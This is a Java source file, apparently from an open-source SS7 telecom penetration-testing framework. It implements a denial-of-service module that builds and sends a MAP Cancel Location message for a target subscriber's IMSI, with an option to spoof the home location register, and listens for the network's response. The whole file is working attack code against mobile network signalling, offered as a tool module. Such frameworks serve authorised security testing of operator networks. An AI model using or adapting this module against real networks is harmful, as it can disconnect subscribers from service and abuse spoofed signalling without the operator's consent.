/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.intruder.ss7.usecases.attacks.dos;

import com.rodan.intruder.ss7.entities.event.model.mobility.ClResponse;
import com.rodan.intruder.ss7.entities.event.model.mobility.details.CancellationType;
import com.rodan.intruder.ss7.entities.event.service.MapMobilityServiceListener;
import com.rodan.intruder.ss7.entities.payload.mobility.ClPayload;
import com.rodan.intruder.ss7.usecases.Ss7ModuleTemplate;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleConstants;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleOptions;
import com.rodan.intruder.ss7.usecases.model.dos.DosClOptions;
import com.rodan.intruder.ss7.usecases.model.dos.DosClResponse;
import com.rodan.intruder.ss7.usecases.port.Ss7Gateway;
import com.rodan.library.model.Constants;
import com.rodan.library.model.annotation.Module;
import com.rodan.library.model.error.SystemException;
import com.rodan.intruder.kernel.usecases.SignalingModule;
import lombok.Builder;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

@Module(name = Ss7ModuleConstants.DOS_CL_NAME, category = Ss7ModuleConstants.DOS_CATEGORY_DISPLAY_NAME,
        displayName = Ss7ModuleConstants.DOS_CL_DISPLAY_NAME, brief = Ss7ModuleConstants.DOS_CL_BRIEF,
        description = Ss7ModuleConstants.DOS_CL_DESCRIPTION, rank = Ss7ModuleConstants.DOS_CL_RANK,
        mainPayload = Constants.CL_PAYLOAD_NAME)
public class DosClModule extends Ss7ModuleTemplate implements SignalingModule, MapMobilityServiceListener {
    final static Logger logger = LogManager.getLogger(DosClModule.class);

    @Builder
    public DosClModule(Ss7Gateway gateway, Ss7ModuleOptions moduleOptions) {
        super(gateway, moduleOptions);
    }

    @Override
    protected void generatePayload() {
        logger.debug("Generating payload");
        logger.debug("Module Options: " + moduleOptions);
        var options = (DosClOptions) moduleOptions;
        var localGt = options.getNodeConfig().getSs7Association().getLocalNode().getGlobalTitle();
        //  TODO Check CancellationType.subscriptionWithdraw
        var payload = ClPayload.builder()
                .localGt(localGt).imsi(options.getImsi()).targetVlrGt(options.getTargetVlrGt())
                .targetHlrGt(options.getTargetHlrGt()).cancellationType(CancellationType.updateProcedure)
                .spoofHlr(options.getSpoofHlr())
                .mapVersion(options.getMapVersion())
                .build();
        setMainPayload(payload);
        setCurrentPayload(getMainPayload());
        logger.debug("Payload: " + payload);
    }

    @Override
    protected void addServiceListener() throws SystemException {
        logger.debug("Adding service listeners");
        super.addServiceListener();
        var localSsn = getMainPayload().getLocalSsn();
        getGateway().addMobilityServiceListener(localSsn, this);
    }

    @Override
    protected void cleanup() throws SystemException {
        super.cleanup();
        if (getGateway() != null && getMainPayload() != null) {
            var localSsn = getMainPayload().getLocalSsn();
            getGateway().removeMobilityServiceListener(localSsn, this);
        }
    }

    @Override
    public void onCancelLocationResponse(ClResponse response) {
        logger.debug("##### Received CL response!");
        logger.debug(response);
        moduleResponse = DosClResponse.builder().result("CL response received successfully").build();
        setResultReceived(true);
    }
}
